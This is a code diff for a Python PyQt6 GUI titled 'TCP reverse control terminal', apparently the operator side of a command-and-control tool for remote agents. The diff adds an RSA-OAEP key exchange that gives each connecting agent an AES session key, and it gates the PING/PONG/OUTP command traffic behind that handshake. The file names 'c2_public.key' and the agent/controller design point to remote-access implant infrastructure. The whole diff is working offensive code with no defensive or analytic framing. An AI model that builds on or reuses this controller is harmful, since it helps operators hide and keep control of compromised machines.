@@ -9,6 +9,8 @@ QMenu, QAbstractItemView)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot
 import struct
 from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
 
 
 class ClientSignals(QObject):
@@ -17,7 +19,7 @@ class ClientSignals(QObject):
 
 
 class ClientSession:
-    def __init__(self, conn: socket.socket, addr):
+    def __init__(self, conn: socket.socket, addr, pub_blob: bytes, rsa_priv):
         self.conn = conn
         self.addr = addr
         self.ip_str = f"{addr[0]}:{addr[1]}"
@@ -26,8 +28,21 @@ class ClientSession:
         self._recv_buf = bytearray()
         self.signals = ClientSignals()
 
+        # 握手相关
+        self.handshake_done = False
+        self.aes_key: bytes | None = None
+        self.rsa_private = rsa_priv
+
+        # 第一步：发送公钥BLOB给agent（握手第一步）
+        header = struct.pack(">I", len(pub_blob))
+        pkt = header + pub_blob
+        try:
+            self.conn.sendall(pkt)
+        except Exception:
+            self.connected = False
+
     def send_packet(self, body: bytes) -> bool:
-        if not self.connected:
+        if not self.connected or not self.handshake_done:
             return False
         try:
             body_len = len(body)
@@ -108,7 +123,8 @@ class ClientListModel(QAbstractListModel):
         if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
             return QVariant()
         s = self.items[index.row()]
-        return QVariant(f"{s.ip_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")
+        hs = "✓握手完成" if s.handshake_done else "握手中"
+        return QVariant(f"{s.ip_str} | {hs} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")
 
     def add(self, sess: ClientSession):
         self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
@@ -123,8 +139,11 @@ class ClientListModel(QAbstractListModel):
 
 
 class MainWindow(QMainWindow):
-    def __init__(self):
+    def __init__(self, pub_blob, rsa_key):
         super().__init__()
+        self.pub_blob_data = pub_blob
+        self.rsa_private_key = rsa_key
+
         self.setWindowTitle("TCP 反向控制端")
         self.resize(700, 500)
         self.server_sock: socket.socket | None = None
@@ -167,7 +186,8 @@ class MainWindow(QMainWindow):
         while self.server_running:
             try:
                 conn, addr = self.server_sock.accept()
-                sess = ClientSession(conn, addr)
+                # 新建会话，立刻传入公钥blob、私钥，构造的时候自动发送公钥给agent
+                sess = ClientSession(conn, addr, self.pub_blob_data, self.rsa_private_key)
                 sess.signals.on_outp.connect(self.handle_session_outp)
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 self.client_model.add(sess)
@@ -206,9 +226,35 @@ class MainWindow(QMainWindow):
                     if len(buf) < total_packet_len:
                         break
 
-                    body = buf[4:total_packet_len]
+                    body = bytes(buf[4:total_packet_len])
                     del buf[:total_packet_len]
 
+                    # -------- 握手阶段：还没有完成握手，这个包就是agent返回的256字节RSA密文 --------
+                    if not sess.handshake_done:
+                        if body_len == 256:
+                            try:
+                                # Windows BCrypt OAEP‑SHA1解密
+                                aes16 = sess.rsa_private.decrypt(
+                                    body,
+                                    padding.OAEP(
+                                        mgf=padding.MGF1(algorithm=hashes.SHA1()),
+                                        algorithm=hashes.SHA1(),
+                                        label=None
+                                    )
+                                )
+                                sess.aes_key = aes16
+                                sess.handshake_done = True
+                                self.log(f"[{sess.ip_str}] ✅握手完成，获得AES密钥")
+                                self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
+                            except Exception as e:
+                                self.log(f"[{sess.ip_str}] ❌RSA解密失败:{repr(e)}")
+                                sess.close()
+                        else:
+                            self.log(f"[{sess.ip_str}] 握手收到异常包 len={body_len}")
+                            sess.close()
+                        continue
+
+                    # -------- 握手完成之后，才处理业务包（PING / OUTP等）--------
                     if len(body)>=4:
                         cmd_code = body[0:4]
                         if cmd_code == b"PONG":
@@ -277,18 +323,15 @@ class MainWindow(QMainWindow):
 
 
 def main():
-    # 获取exe所在目录（打包后），本地py运行取脚本目录
     if hasattr(sys, '_MEIPASS'):
         exe_dir = os.path.dirname(sys.executable)
     else:
         exe_dir = os.path.dirname(os.path.abspath(__file__))
 
-    # 读取 genblob原始公钥BLOB，原样二进制，握手发给Agent
     pub_blob_path = os.path.join(exe_dir, "c2_public.key")
     with open(pub_blob_path, "rb") as f:
         pub_blob_data = f.read()
 
-    # 读取本地转换工具生成的 private.pem，加载RSA私钥对象
     pem_path = os.path.join(exe_dir, "private.pem")
     with open(pem_path, "rb") as f:
         rsa_private_key = serialization.load_pem_private_key(
@@ -296,10 +339,8 @@ def main():
             password=None
         )
 
-    # ========== 后续加密解密业务，直接使用 pub_blob_data、rsa_private_key ==========
-
     app = QApplication(sys.argv)
-    win = MainWindow()
+    win = MainWindow(pub_blob_data, rsa_private_key)
     win.show()
     sys.exit(app.exec())
 
@@ -309,7 +350,6 @@ if __name__ == "__main__":
         main()
     except Exception:
         import traceback
-        # 崩溃日志输出exe同目录
         if hasattr(sys, '_MEIPASS'):
             exe_dir = os.path.dirname(sys.executable)
         else:
